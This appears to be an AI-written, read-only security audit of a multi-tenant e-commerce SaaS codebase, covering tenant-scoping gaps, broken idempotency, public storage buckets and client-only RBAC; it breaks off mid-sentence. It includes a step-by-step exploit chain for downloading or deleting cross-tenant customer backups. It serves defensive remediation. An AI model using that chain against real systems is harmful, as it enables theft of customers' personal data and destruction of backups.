# Scheniders — State-of-the-Art Platform Audit

**Date:** 2026-09-17 · **Branch:** `feat/notifications-overhaul` · **Live project:** `sduvpgqwhxragxtxztur`
**Method:** house SOTA standard (`docs/audits/ORDERS_PAGE_SOTA_AUDIT_PROMPT.md`), applied platform-wide.
**Companion:** [SOTA_AND_OMS_GAP_ASSESSMENT_2026-09-16.md](./SOTA_AND_OMS_GAP_ASSESSMENT_2026-09-16.md) — strategic/feature gaps. This
document is the engineering defect audit.

**Gate acknowledged.** This run was **read-only**. No file was edited, no migration applied, no DDL or DML executed
against any database. Nothing below is fixed. Execution unlocks only on the exact sentence, scoped to named findings.

**Scope boundary (house rule):** no keyboard-shortcut or keyboard-a11y sweep was performed, and no redesign is proposed.
Visual issues appear only where something is broken or missing, never as taste.

---

## Verdict

**NO-GO for a public SaaS launch. GO for continued operation with the current, known merchant set** — provided the six
P0s below are closed first.

This is a **materially better codebase than the 2026-05 report describes.** Most of that audit's P0s are genuinely
closed, and several are closed *well* (server-side price verification at checkout is textbook). The remaining defects are
narrower and more interesting: they are not "nobody thought about security," they are **safeguards that were designed,
half-wired, and then quietly defeated** — an idempotency guard that can never fire, a conflict check undone by its own
retry, a submit-lock column nothing writes, a concurrency version column nothing reads.

That pattern is the headline finding. The codebase knows the right patterns. It does not consistently finish them, and
nothing in CI notices.

### Scorecard (1–5)

| Dimension | Score | Rationale |
|---|---|---|
| Domain modelling | **4** | 154 tables, real ledgers, atomic RPCs with inverses. Genuinely strong. |
| Tenant isolation (DB/RLS) | **3.5** | Always-true policies down 33 → 7. But 56 nullable `tenant_id` columns and 550 already-orphaned rows. |
| Tenant isolation (API layer) | **2** | 11 service-role routes authenticate the user and never scope to their tenant. |
| Concurrency correctness | **2** | Conflict detection present and then defeated by auto-retry. Idempotency guard is a no-op. |
| Input validation | **2** | Zod on 5 of 57 platform routes, against the project's own written rule. |
| Supply chain | **1.5** | 6 critical, 79 high advisories, including two Next.js RCEs and prototype pollution in the lib that parses merchant uploads. |
| Observability | **1.5** | Sentry DSN stripped at build time; 463 `console.log`; 1 health endpoint across 3 apps. |
| Test & release engineering | **2** | Tests not in CI; 2 e2e specs; migration drift unresolved. |
| Correctness of money | **4** | No float money columns anywhere. Verified. |
| Frontend resilience | **2.5** | 7 `error.tsx` across three apps; 15 empty catch blocks. |

---

## P0 — launch-blocking

### P0-1 · Eleven service-role API routes authenticate the user but never scope to their tenant

**Evidence.** Each of these calls `verifyAccessToken` (valid login required), then queries with the service role — which
bypasses RLS — using an identifier taken from the request, with **no tenant predicate anywhere in the file**:

- `app/api/orders/delete/route.ts:88` — `UPDATE orders SET deleted_at` filtered by `.in('id', ids)` only. The role check
  at `:47` reads the global `user_profiles.role`, not tenant membership.
- `app/api/customers/[phone]/ai-summary/route.ts` — resolves a phone with the service role, no tenant filter. Cross-tenant
  customer PII, summarised by an LLM, billed to you.
- `app/api/delivery-import/rollback/route.ts` — reverses a confirmed import (restores statuses, prices, delivery
  provenance). The string `tenant` does not appear in the file. Same class: `confirm`, `complete`, `match`, `history`.
- `app/api/waseet/submit-orders/route.ts`, `waseet/statuses`, `waseet/package-sizes`, `waseet/city-mappings`.

**Impact.** Any authenticated user of any tenant can soft-delete another merchant's orders, read another merchant's
customers, reverse another merchant's delivery reconciliation, and submit another merchant's orders to the courier.

**Fix.** Route them through `resolveCallerTenant()` / `requireTenantAdmin()` from `lib/auth/require-caller.ts` — which
already exists and is used correctly by `webhooks/interakt/send` and the billing actions — then add the tenant predicate
to every service-role query. Same remediation shape as PRs #88/#90.

**Also unauthenticated entirely:** `settings/auto-send` (GET+PUT), `domains/verify` (POST — anyone marks any tenant's
domain verified), `cron/process-checkouts-manual` (GET).

---

### P0-2 · Order-creation idempotency is a no-op end to end — this is the root cause of the duplicate-order problem

Two independent defects stack into zero protection.

**Client side.** `hooks/use-order-crud.ts:395`:

```ts
const fingerprint = `create_${cleanOrderData.order_id || ''}_${cleanOrderData.phone || ''}_${Date.now()}`;
const idempotencyKey = generateIdempotencyKey(fingerprint);
```

The fingerprint embeds `Date.now()`, so it differs on every call. And `generateIdempotencyKey` (`lib/idempotency.ts:12`)
appends a fresh UUID regardless:

```ts
return `${prefix}_${crypto.randomUUID()}`;
```

So `guard.tryExecute(key)` **can never return false.** The guard is also in-memory and per-tab, so even a correct key
would not survive a reload or protect a second device.

**Server side.** A real idempotency mechanism exists — migration `20260613130000_order_idempotency_key.sql`, honoured by
`create_order_atomic`, which returns the existing order for a repeated key. **Only the storefront checkout passes one**
(`apps/storefront/app/actions/checkout.ts:348`). Every platform-side creation path omits it:

- `lib/orders/create-order-core.ts:71` — manual order entry
- `lib/lightfunnels-api.ts:789` and `:922` — LightFunnels import
- `lib/webhook-handler.ts:923` — webhook ingestion

**Impact.** Manual order entry, LightFunnels import and webhook ingestion have **no duplicate protection at any layer**.
This is almost certainly the origin of the duplicate orders that the duplicate-alert banner, the duplicate-comparison
modal, `get_order_duplicate_flags`, and the whole merge/unmerge subsystem exist to clean up after. A large, well-built
feature is compensating for a two-line bug.

**Fix.** Make the fingerprint deterministic (no `Date.now()`), have `generateIdempotencyKey` hash the fingerprint instead
of appending a UUID, and pass `idempotency_key` into `create_order_atomic` from all four server paths. The DB already
does the rest.

---

### P0-3 · The optimistic-concurrency check is defeated by its own retry — silent lost updates

`hooks/use-order-crud.ts` does conflict detection properly at `:329`, sending `expectedUpdatedAt` so the server rejects a
stale write with `CONFLICT_DETECTED`. Then `:363`:

```ts
if (err instanceof Error && err.message === "CONFLICT_DETECTED" && retryCount < 2) {
    await queryClient.invalidateQueries({ queryKey: orderKeys.lists() });
    await new Promise(resolve => setTimeout(resolve, 300)); // Brief delay for cache to update
    return updateOrder(orderId, updates, undefined, retryCount + 1);
}
```

The retry passes `expectedUpdatedAt = undefined`, which falls back to the refreshed cache value — then re-applies **the
same `updates`** on top of whatever the other user just wrote. The conflict is detected, then overwritten, twice, and
`:379` suppresses the toast so **nobody is told.** Net behaviour is last-write-wins with extra steps.

On the orders queue, worked simultaneously by multiple agents, this is routine data loss. Two people editing one order —
customer address and order status — and one edit vanishes silently.

Secondary: the `setTimeout(300)` "brief delay for cache to update" is exactly the sleep-hack `CLAUDE.md` bans, and it is
load-bearing here.

Tertiary: `orders.version` (integer) exists and is maintained by the `increment_order_version` trigger, and **no code
reads it.** The weaker timestamp check was built alongside a stronger unused one.

**Fix.** Surface the conflict instead of retrying: refetch, show the other user's change, let the human merge. Where an
auto-retry is genuinely safe (single-field status flips) re-derive the update from fresh server state rather than
replaying the stale payload. Switch the predicate to `version`.

---

### P0-4 · Dependency tree: 6 critical, 79 high advisories

`pnpm audit` on the current lockfile. The ones that matter here, not in the abstract:

| Package | Severity | Why it matters *in this app* |
|---|---|---|
| `next` | **critical ×2** | Unauthenticated RCE in the Image Optimization API. The storefront serves merchant-uploaded product images through it. |
| `xlsx` | high | Prototype pollution in SheetJS. `delivery-import/parse` feeds it **courier spreadsheets uploaded by merchants**. Directly reachable by untrusted input. |
| `jspdf` | **critical ×2**, high | Path traversal, HTML injection, PDF injection. Used for shipping labels and payslips. |
| `undici` | high | TLS certificate validation bypass — outbound calls to the courier and WhatsApp APIs. |
| `tar`, `ws`, `vite`, `vitest`, `tmp`, `js-yaml`, `brace-expansion` | critical/high | Mostly build-time, lower runtime exposure. |

`xlsx` + `next` are the two with a clear path from untrusted input to execution. Treat those as the P0; the rest are a
sweep.

**Fix.** Upgrade Next past the advisory, replace or pin `xlsx` (SheetJS has moved off the npm `xlsx` name — check the
current supported distribution), upgrade `jspdf` and `undici`, then add `pnpm audit --audit-level=high` to CI so the
count cannot silently climb again.

---

### P0-5 · Production error reporting is almost certainly dead

`turbo.json` `build.env` declares 7 variables. The source references **13 distinct `NEXT_PUBLIC_*`** vars. Undeclared
vars are stripped from the build environment, so Next inlines `undefined` — locally it works (`.env.local` bypasses
turbo), on Vercel it is silently dead.

`NEXT_PUBLIC_SENTRY_DSN` is undeclared, and it is the **only** DSN source for both `sentry.client.config.ts:4` and
`sentry.server.config.ts:4`. Next inlines `NEXT_PUBLIC_*` at build time in server code too.

Also stripped: `NEXT_PUBLIC_VAPID_PUBLIC_KEY` (web push — already known to have been killed this way),
`NEXT_PUBLIC_PLATFORM_ORIGIN`, `NEXT_PUBLIC_STOREFRONT_ORIGIN`, `NEXT_PUBLIC_STOREFRONT_URL`,
`NEXT_PUBLIC_STOREFRONT_ROOT_DOMAIN`, `NEXT_PUBLIC_SUPPORT_WHATSAPP`, `NEXT_PUBLIC_CATEGORIES_V2`.

**Impact.** If confirmed, the platform has been reporting no errors in production. That is consistent with the incident
history: an open WhatsApp relay and a backup that had never run once were both eventually found by reading raw logs, not
by an alert.

**Verify first — one minute:** check whether the Sentry project has received any platform event recently. **Fix:** declare
all 13 in `build.env`, plus a test asserting every `NEXT_PUBLIC_*` in source appears there. This class has already been
diagnosed once and regressed.

---

### P0-6 · `qc-evidence` storage bucket is public, uncapped, and unfiltered

Live `storage.buckets`: `public = true`, `file_size_limit = null`, `allowed_mime_types = null`. Finding F-07 from
2026-05, still open. Anyone with a URL reads any tenant's QC photos; any authenticated writer uploads a file of any type
and any size.

Six of eight buckets were properly locked down (caps + MIME allowlists) — this one and `tenant-assets` were missed.
`tenant-assets` still permits `image/svg+xml` on a public bucket, which is a stored-XSS vector when served inline (F-24).

---

## P1 — serious

### P1-1 · 56 tables have a nullable `tenant_id`, and 550 rows are already orphaned

The 2026-05 report found 5 such tables. The live count is **56**, including `orders`, `products`, `product_variants`,
`inventory_ledger`, `order_status_history`, `payroll_records`, `expenses`, `whatsapp_logs`, `blacklist`.

Rows with a NULL `tenant_id` fail every `tenant_id IN (...)` predicate, so they become invisible to every tenant — silent
data loss rather than a leak. Already happened:

| Table | Orphaned | Total |
|---|---|---|
| `whatsapp_logs` | 315 | 9,095 |
| `order_status_history` | 225 | 77,497 |
| `delivery_imports` | **8** | **17** |
| `inventory_ledger` | 2 | 2,619 |

`delivery_imports` is **47% orphaned**. Those are COD reconciliation records that no merchant can see.

**Fix.** Backfill from the parent row where derivable, then `SET NOT NULL` on every tenant-scoped table. The NULLs are a
symptom — something is writing without a tenant, and the backfill will show what.

### P1-2 · Courier submission has a TOCTOU race, and the lock column was never wired

`app/api/waseet/submit-orders/route.ts:120` guards with `if (order.waseet_qr_id) return "Already submitted"` — a
read-then-write with no lock. Two concurrent submissions both read a null `qr_id` and both create **real shipments for
one order**, which means a real duplicate parcel and a real duplicate delivery fee.

`orders.waseet_submit_started_at` exists in the schema for exactly this purpose and **no code writes or reads it** — only
a comment at `lib/repositories/order-repository.ts:112` mentions it. Second instance of the P0-3 pattern: the safeguard
was designed and left unwired.

Related, at `:169`: if Waseet accepts but the local DB update fails, the order has a live shipment and no local record.
The code correctly surfaces the `qr_id` in the error, but nothing reconciles it afterwards.

### P1-3 · The audit trail is written client-side, after the fact, best-effort

`use-order-crud.ts:342` inserts into `order_status_history` from the browser, **after** the update succeeds, in a
separate non-transactional statement. On failure the user is told "Changes saved, but the audit entry could not be
recorded" and the change stands without a trail.

Two consequences: the audit log has holes by design, and because the client writes it directly, a modified client can
forge arbitrary history rows. An audit trail that the audited party can write is not an audit trail.

**Fix.** Write history in the same transaction as the mutation — a trigger on `orders`, or inside the status-transition
RPC proposed in the companion document.

### P1-4 · UTC day bucketing on a UTC+3 market

`lib/order-filter-utils.ts:308` documents the hazard and provides `getLocalDateString()`. **16 sites still use raw
`toISOString().split('T')[0]`.** Most are filenames and harmless. These are not:

- `components/orders/order-details-modal.tsx:684` — renders the order's date as its **UTC** date. An order placed at
  01:00 Baghdad displays as the previous day, on the most-used screen in the product.
- `order-details-modal.tsx:908,920` — "tomorrow" for postpone computed in UTC. Between 21:00 and midnight Baghdad this
  schedules the wrong day.
- `hooks/use-batch-analytics.ts:160`, `components/customers/purchase-heatmap.tsx:23` — analytics bucketed by UTC day.
  Same class as the dashboard `-6h` shift that understated a day's revenue by 59%.
- `lib/lightfunnels-api.ts:521,560` — sync window end computed in UTC.

Note `getLocalDateString()` uses the **browser's** timezone, not `Asia/Baghdad`. Correct for a merchant on a Baghdad
clock; wrong on the server, in cron, and on any misconfigured device.

**Fix.** One canonical `baghdadDay(date)` helper in `packages/shared`, pinned to `Asia/Baghdad` (UTC+3, no DST), used by
client, server and SQL alike. Lint-ban raw `toISOString().split`.

### P1-5 · Residual always-true RLS policies

Down from 33 to 7 — real progress. Most of the residue is legitimately global reference data (`plan_limits`,
`waseet_districts`, `waseet_regions`, `tenant_slug_history`). These are not:

- `user_permissions` · `user_read_own_permissions` · `SELECT` · `qual = (auth.role() = 'authenticated')` — despite the
  name it filters on nothing. Any signed-in user reads every user's permissions. Currently 0 rows, so the impact is
  latent, not live.
- `role_permissions` · `authenticated_read_roles` — same shape; arguably global config, lower risk.
- `system_health_checks` · `qual = (auth.uid() IS NOT NULL)` — any signed-in user reads platform health.

### P1-6 · Validation, rate limiting, and resilience states

- **Zod on 5 of 57 platform API routes**, against the project's own explicit rule. The other 52 destructure raw JSON.
- **No HTTP rate limiting anywhere.** `middleware.ts` is session-refresh only and excludes `/api` by design. Auth, the
  three AI routes (each of which costs money per call), and the anon-callable `lookup_order` RPC are all open to
  enumeration. The `api_rate_limits` table exists, has RLS enabled with **zero policies**, and is inert.
- **7 `error.tsx` across three apps** (5 / 1 / 1), and 15 genuinely empty `catch {}` blocks.
- **130 `.select('*')`** calls in platform data paths — over-fetch, and they silently widen whenever a column is added.

### P1-7 · A business rule executes in the customer's browser

`/api/cron/auto-no-response` ("contacted > 2 days → `no_response`") is triggered by **nothing**: absent from
`vercel.json`, absent from live `cron.job`. The transition actually runs in `hooks/use-auto-no-response.ts` via
`resolveStaleContacted()`, called from `use-orders-query.ts` — in whichever browser opens the orders page.

Order status therefore depends on who looked, and when. Same failure shape as the Activity Feed that was dead 102 days.

For contrast the healthy pattern is present: 11 active `pg_cron` jobs and QStash driving `auto-follow-up`. This one route
is the outlier.

---

## P2 — should fix, not blocking

- **108 unindexed foreign keys**, 43 RLS policies re-evaluating `auth.*()` per row, 57 multiple-permissive-policy
  combinations, 77 unused indexes. At today's volume (22,943 orders; 77,497 status rows) none of this hurts yet — which
  is precisely why to fix it now rather than during an incident.
- **26 functions with mutable `search_path`**; `pg_net` in `public`; HaveIBeenPwned protection disabled.
- **`customer_aggregates` view is `SECURITY DEFINER`** (advisor ERROR) — same class as the 2026-05 matview P0.
- **`lookup_order`** is anon-callable and unrate-limited → `(phone, order_number)` enumeration.
- **Migration drift** — 234 files, 17 untimestamped legacy. Until `db diff` is clean, the live schema is unverified.
- **Dead infrastructure:** `lib/tenant-integrations.ts` has no callers; `orders.version` unread; `waseet_submit_started_at`
  unwritten.
- **Type debt:** 254 `any`, 81 `@ts-ignore`, 130 `eslint-disable`, 463 `console.log`, all against house rules.
- **No `sitemap.ts`** on the storefront (robots + JSON-LD are done).
- **Custom domains** verify DNS but nothing calls the Vercel Domains API — no cert is ever provisioned.

---

## What is genuinely strong

Stated plainly, because the list above is long and would otherwise misrepresent the codebase.

1. **Checkout price verification** (`storefront/app/actions/checkout.ts:155`) — re-fetches canonical prices, returns a
   structured `price_changed` issue per line rather than dead-ending. Better than most production e-commerce code.
2. **No float money anywhere.** Every price/amount/total/salary/fee column is `numeric` or integer. Verified across all
   154 tables.
3. **Order domain depth** — atomic RPCs with working inverses (`unmerge`, `unsplit`, `undo_return`), an inventory ledger
   with phase-based reservation, status history, deletion log.
4. **Child-table RLS done correctly** — `purchase_order_items`, `stock_take_items`, `product_tag_assignments` all scope
   through a join to the parent's `tenant_id`.
5. **Always-true policies cut from 33 to 7**, and storage buckets from fully open to 6 of 8 properly capped and filtered.
6. **`requireCronAuth`** fails closed with an explicit written rationale — an example of a safeguard finished properly.
7. **i18n parity is machine-enforced** (`i18n-completeness.test.ts`, `i18n-parity.test.ts`, `i18n-nav-keys.test.ts`).
8. **11 healthy `pg_cron` jobs**, including a working SLA check.

---

## Corrections to earlier reports

- The 2026-09-16 companion said there is **no SLA engine**. Wrong: `check_order_sla(2, 6, 24)` runs on `*/30` pg_cron.
  What is missing is the exception *console*, not the detection. Already corrected in that document.
- The 2026-05 report's B-11 (**client-supplied checkout prices**) is **closed**, and closed well.
- The 2026-05 report's F-19 said **5 tables** have a nullable `tenant_id`. The live number is **56**.
- An intermediate pass of mine listed ~24 "unauthenticated service-role routes." That was a grep artefact — it missed
  `verifyAccessToken` and `resolveCallerTenant`. The accurate figure is **3 unauthenticated** plus **11
  authenticated-but-not-tenant-scoped**, which is the more dangerous category and is P0-1 above.

---

## Proposed fix campaign — awaiting approval, nothing started

Ordered by risk-reduction per hour. Each round needs the approval sentence, scoped to the findings named in it.

| Round | Contents | Est. |
|---|---|---|
| **R1** | P0-5 (turbo env + verify Sentry), P0-6 (buckets), P0-4 partial (`next`, `xlsx`) | ~2h |
| **R2** | P0-1 — tenant-scope the 11 routes, auth the 3 | ~4h |
| **R3** | P0-2 + P0-3 — idempotency end to end, conflict surfacing, `version` predicate | ~5h |
| **R4** | P1-1 (backfill + `NOT NULL`), P1-2 (submit lock), P1-3 (audit trail in-transaction) | ~6h |
| **R5** | P1-4 (`baghdadDay`), P1-6 (Zod sweep, rate limiting), P1-7 (schedule the cron) | ~8h |
| **R6** | P2 sweep — indexes, `search_path`, migration drift, dead code, CI gates | ~6h |

Two CI gates are worth more than any single fix, because they stop this class from recurring:
`pnpm audit --audit-level=high`, and a test asserting every `NEXT_PUBLIC_*` in source appears in `turbo.json` `build.env`.

---

## The one-line diagnosis

**This codebase designs the right safeguard and then leaves it unwired.** An idempotency guard that cannot fire, a
conflict check undone by its retry, a submit-lock column nothing writes, a version column nothing reads, a cron route
nothing triggers, a Sentry DSN stripped at build. Each was built correctly and then not finished — and because tests are
not in CI and error reporting is dead, nothing ever said so.

Fix the six P0s, then add the two CI gates. The gates matter more than the fixes.

---

# Round 3 — storage ACLs, RBAC enforcement, inventory truth, data hygiene

Still read-only. No code changed, no migration, no DML.

This round went after the layers the first two passes did not reach: storage object policies, whether RBAC is enforced
anywhere but the browser, whether the inventory ledger is authoritative, and what is actually in the production database.

It contains **the most severe finding in any of the three documents.**

---

## P0-7 · Any authenticated user can download — and delete — every nightly cross-tenant backup

**Evidence.** Live `storage` policy:

| policyname | cmd | roles | qual |
|---|---|---|---|
| `Allow authenticated full access to vault_backups` | **ALL** | `{authenticated}` | `bucket_id = 'vault_backups'` |

No tenant prefix check. No owner check. `ALL`, not `SELECT`.

**What is in that bucket right now:** 28 objects, **193 MB**, nightly since 2026-09-10 (7-day retention). Each night's
set is a platform-wide, cross-tenant dump:

- `orders.csv` — **18.9 MB**, every order in the database: customer name, phone, address, city, items, prices, status
- `customers.csv` — 1.7 MB, every customer across every tenant
- `products.csv` — 78 KB, including the `cost` column

**The full exploit chain, using only public endpoints:**

1. `POST /api/auth/signup` — public, unrate-limited, and sets `email_confirm: true`, so the address is never verified.
   Takes seconds and needs no real identity.
2. You are now `authenticated`.
3. `storage.from('vault_backups').list()` then download — the policy grants it.
4. You hold every merchant's complete order and customer database.

And because the verb is `ALL`, the same account can **overwrite or delete every backup**, destroying disaster recovery on
the way out.

This is finding F-22 from the 2026-05 report, still open 4 months later. Given the single real tenant today the practical
blast radius is one merchant's book — but it is a complete, unauthenticated-to-full-PII path that gets catastrophically
worse the moment a second merchant signs up.

**Fix.** Restrict the bucket to `service_role` only. Backups should never be reachable by `authenticated` at all; the
vault UI should download through a server route that checks tenant and role and streams a tenant-scoped export.

---

## P0-8 · Anonymous users can delete or overwrite any merchant's product images

**Evidence.** Live `storage` policies on `product-images`:

| policyname | cmd | roles | qual |
|---|---|---|---|
| `Allow Deletions for Product Images` | **DELETE** | `{public}` | `bucket_id = 'product-images'` |
| `Allow Updates to Product Images` | **UPDATE** | `{public}` | `bucket_id = 'product-images'` |
| `Public Read Access for Product Images` | SELECT | `{public}` | `bucket_id = 'product-images'` |

`{public}` includes `anon`. The only condition is the bucket name — no tenant prefix, no owner, no auth.

**Impact.** 122 objects, 79 MB. Anyone on the internet with the anon key (which ships in the browser bundle by design)
can delete every product image on every storefront, or replace them with arbitrary images. Storefront defacement and
catalogue destruction, no login required. Related: `qc-evidence` has public `SELECT` and `authenticated` `DELETE`, also
with no tenant prefix.

**Fix.** DELETE/UPDATE to `authenticated` only, with a tenant-prefix predicate on the object path (`name like tenant_id
|| '/%'`). Keep public SELECT — that one is intentional.

---

## P0-9 · RBAC is decorative — zero server-side enforcement

`lib/permissions.ts` defines a full matrix: four roles, 14 permissions including `DELETE_ORDERS`, `MANAGE_USERS`,
`VIEW_FINANCIALS` ("cost/profit data"), `BLOCK_CUSTOMERS`.

**It is referenced in 7 files. All of them are client components:**

```
components/admin/rbac-matrix.tsx              ← the UI for configuring it
components/auth/role-guard.tsx                ← hides UI
components/providers/financial-visibility-provider.tsx
components/orders/cancellation-reason-dialog.tsx
components/settings/pages-settings.tsx
components/settings/team-settings.tsx
lib/permissions.ts
```

`grep` across `app/api/**` and `app/actions/**` for `hasPermission` / `ROLE_PERMISSIONS` / `PERMISSIONS.` returns
**nothing**. And only **2** RLS policies in the entire schema differentiate by role.

**Confirmed consequence — supplier cost is readable by every role.** Column privileges on `products`:

```
authenticated · SELECT · cost, price, website_price
```

RLS `tenant_isolation_select` gates on tenant membership only. So a `viewer` — the role that exists specifically to
*not* see money — can read `products.cost` directly through the Supabase client. `financial-visibility-provider` hides
the number in the UI and nothing hides it in the data.

The same holds for every other permission: the browser decides. Any tenant member can issue the mutation the UI hid from
them.

**Fix.** Permissions must be enforced where the data is: role-aware RLS, or a `requirePermission()` check in every server
action and API route (the `require-caller.ts` helpers are the right place). Client-side checks stay, as UX.

---

## P1-8 · The inventory ledger is not the source of truth

`inventory_ledger` exists with `delta_stock`, `delta_reserved`, `delta_open_box`, and `inv_apply()` maintains it. But at
least **8 code paths write `products.stock_quantity` directly**, bypassing the ledger entirely:

```
components/products/bulk-operations-panel.tsx:323   supabase.from("products").update({ stock_quantity: newQty })
components/products/stock-take/stock-take-mode.tsx:666
components/products/reports/shrinkage-report.tsx:277
components/products/supplies-tab.tsx:353
hooks/use-products-query.ts:265
lib/inventory-engine.ts:235
components/products/editor/product-inventory-section.tsx:56   (direct field edit)
components/products/editor/product-variants-section.tsx:86
```

**Confirmed drift in live data.** Reconciling `products` against the ledger sum:

- 1 product has `reserved_quantity = 1` with **no corresponding ledger row** — a reservation exists that the ledger
  cannot explain.
- 1 product has **negative `stock_quantity`**, and 1 has `reserved_quantity > stock_quantity`.

The absolute numbers are small (48 products). The point is not the magnitude, it is that **drift is possible at all** —
which means every ledger-derived report is approximate, `recompute_inventory()` and `zero_oversold()` are fighting direct
writers rather than correcting a single writer, and stock changes made through those 8 paths have no audit row.

**Fix.** Make `inv_apply` the only writer — revoke direct UPDATE on the quantity columns and route stock takes,
shrinkage, bulk edits and manual edits through it with an explicit `reason`. Then the ledger genuinely reconstructs state.

---

## P1-9 · The nightly backup covers 3 tables out of 154

`vercel.json` runs `/api/cron/backup` daily and it works (confirmed: objects written every night since 2026-09-10). It
backs up **`orders`, `customers`, `products`** as CSV.

Not backed up: `wallet_transactions` (17,803 rows of financial ledger), `inventory_ledger`, `order_status_history`
(77,497 rows — the audit trail), `store_config_versions` and `tenants.store_config_v2` (every merchant's entire
storefront), `payroll_records`, `expenses`, `customer_trust`, `subscriptions`, chat, notifications — 151 tables.

Restoring from this would give you three flat CSVs and no ledgers, no history, no storefronts, no money.

Secondary concerns: CSV round-trip fidelity for JSON columns (`orders.items` is JSON stringified into a CSV cell), and no
tested restore path — the vault UI can parse and diff, but "we have never restored" is the same category of unknown as
"the backup has never run", which is exactly what was found here before.

**Fix.** This is what Supabase PITR is for — enable it and treat the CSV job as a convenience export, not as DR. If the
CSV job stays, expand it to the ledger and config tables and **rehearse a restore once**.

---

## P1-10 · 89% of the platform is client components

```
"use client" files:           604
total .tsx in app/+components/: 680
```

A Next.js 16 App Router application with essentially no server components. This is the structural reason behind the
performance profile already in the record: data fetched on the client, auth resolved on the client (`localStorage`-only
until recently), large JS bundles, and a dashboard that gated first paint on a multi-megabyte orders fetch.

Not a defect to fix in one pass — but it is the ceiling on every perf improvement, and worth naming as an architectural
decision to revisit rather than a list of symptoms to chase. It also explains why 130 `.select('*')` calls exist: they
are in client hooks, where nobody sees the payload size.

---

## P1-11 · Wallet balances can go negative

5 tenants currently hold a negative `balance_iqd`, including **2 with `status = 'active'`** (`اربيل ايتس` at -2,000;
`متجر فاطمة للتجميل` at -10,000) and one suspended at -10,000.

If the wallet is prepaid, `charge_wallet_atomic` is missing a non-negative guard and the platform is delivering billable
service against no funds. If negative balances are intentional credit, the model needs a documented credit limit and a
dunning path. Either way, "silently goes negative" is not a billing policy.

**Verified non-finding, stated for the record:** the wallet ledger is **internally consistent**. For every tenant,
`wallet.balance_iqd` equals the `balance_after_iqd` of its most recent transaction — zero drift across 17,803
transactions. The money trail itself is sound; only the floor is missing.

---

## P1-12 · The production database is 79% demo data

| | Orders | Note |
|---|---|---|
| `Scheniders Iraq` | **4,891** | The one real merchant. Last order **today**. |
| 10 `a1000001-*` seed tenants | **18,052** | Arabic city names (`الموصل ماركت`, `بغداد اكسبرس`…). All `status='active'`. Orders stop **2026-09-08/09** — seed automation was switched off. Fake wallet balances of ~224,000,000 IQD each. |
| ~17 junk tenants | 1 | `Walk msx58g1n`, `Audit Test Store`, `Test Shop 4`, `متجر فاطمة للتجميل` ×2, `متجر نور للتجميل` ×2 … |

Downstream pollution confirmed: **1,711 of 6,034** rows in `mv_customer_aggregates` belong to seed tenants; 10 seed
`subscriptions`; 18 seed `usage_tracking` rows; 12 rows in `tenant_public_stats`; 200 rows in `seed_customers`.

**Consequences.** Every platform-wide metric, the admin dashboard, `tenant_public_stats`, and any future merchant
benchmarking is computed over mostly-fictional data. Seed tenants marked `active` count toward plan limits and
subscription logic. And the seed orders generate real trigger work, real notification rows and real index bloat.

**This also corrects my own earlier statement.** Round 1 said "22,943 orders — perf is not the binding constraint."
The volume figure was right and the framing was wrong: **real production volume is ~4,900 orders for a single merchant.**
The system has never been load-bearing for more than one tenant, which means none of the multi-tenant isolation defects
above have ever actually been exercised in anger. That is luck, not evidence of safety.

**Fix.** Move demo data to a separate Supabase project (or at minimum a `demo` tenant status excluded from every
aggregate), and delete the junk tenants. Until then no dashboard number should be trusted.

---

## Verified non-findings from this round

Recorded so they are not re-investigated:

1. **No float money anywhere.** All 154 tables: every `price|amount|total|cost|salary|fee|balance` column is `numeric`
   or integer. Zero `double precision`/`real`/`money`.
2. **Wallet ledger reconciles exactly** (see P1-11).
3. **No permissive INSERT policies** in the schema — every `INSERT` policy has a real `WITH CHECK`. `products` insert is
   properly gated on `tenant_id IN get_user_tenant_ids()`.
4. `anon` retains redundant `INSERT`/`UPDATE` column grants on `products.cost/price/website_price`, but RLS
   `WITH CHECK` dead-ends them. **Hygiene, not a vulnerability** — worth revoking as defence-in-depth (P2), not urgent.
5. **Child-table RLS is correct** — `purchase_order_items`, `stock_take_items`, `product_tag_assignments` scope through
   a join to the parent's `tenant_id`.
6. **Realtime cleanup looks sound** — 16 `.channel(` calls against 21 `removeChannel`/`unsubscribe` calls; no obvious
   leak.

---

## Revised P0 register (all three rounds)

| # | Finding | Round |
|---|---|---|
| **P0-7** | `vault_backups` readable + deletable by any authenticated user — 193 MB cross-tenant PII, open signup as the entry point | 3 |
| **P0-8** | `product-images` DELETE/UPDATE granted to `anon` — storefront catalogue destruction, no login | 3 |
| **P0-9** | RBAC enforced only in the browser; `authenticated` can read `products.cost` | 3 |
| **P0-1** | 11 service-role routes authenticate but never tenant-scope | 2 |
| **P0-2** | Order idempotency is a no-op end to end → duplicate orders | 2 |
| **P0-3** | Conflict detection defeated by its own retry → silent lost updates | 2 |
| **P0-4** | 6 critical / 79 high dependency advisories (`next` RCE, `xlsx` on merchant uploads) | 2 |
| **P0-5** | Sentry DSN stripped by turbo → production error reporting dead | 2 |
| **P0-6** | `qc-evidence` bucket public, uncapped, unfiltered | 2 |

**P0-7 and P0-8 are single-statement fixes.** They are policy changes, not code changes, and they are the two with the
largest gap between severity and effort in the entire audit.

---

## Still not audited

Named so the picture is honestly incomplete rather than falsely complete:

- Storefront checkout edge cases beyond price verification (coupon stacking, loyalty-point redemption limits, delivery-fee
  derivation, abandoned-cart recovery correctness)
- Discount engine and bundle pricing math
- LightFunnels sync correctness (field mapping, partial-failure behaviour)
- Delivery-import matching algorithm accuracy (false-positive merges)
- Notification pipeline correctness (the current branch's active work)
- Chat attachment authorization
- Payroll and commission calculation correctness
- Test *quality* — 152 files were counted, none were read for whether they assert anything meaningful
- Visual/contrast/hit-target audit of the main surfaces (permitted by house rule; not yet run)
- Bundle size and Core Web Vitals measurement
- Admin app (1 page, largely unexamined)

Say the word and I will keep going on any of these before anything gets fixed.

---

# Round 4 — money math, authorization granularity, admin app, test quality

Read-only. No code, no migration, no DML.

This round covered the discount/loyalty engines, the admin app (properly this time), storage policies for payroll and
chat, and whether the 152 test files actually assert anything.

**Tone note:** this round found more strengths than defects, and two of the strengths are directly useful as the fix
template for Round 3's P0s.

---

## R4-1 · `payroll-pdfs` is gated on role but not on tenant — P1

**Evidence.** Live `storage.objects` policy:

```
Admins can manage payroll pdfs · ALL · {public}
  qual: bucket_id = 'payroll-pdfs'
    AND EXISTS (SELECT 1 FROM user_profiles
                WHERE user_profiles.id = auth.uid() AND user_profiles.role = 'admin')
```

Two defects in one policy:

1. **No tenant scoping.** An admin of tenant A can read, overwrite and delete tenant B's payslip PDFs. Salary data is the
   most sensitive HR content in the product.
2. **It trusts the global `user_profiles.role`**, not tenant membership — the same anti-pattern as `orders/delete`
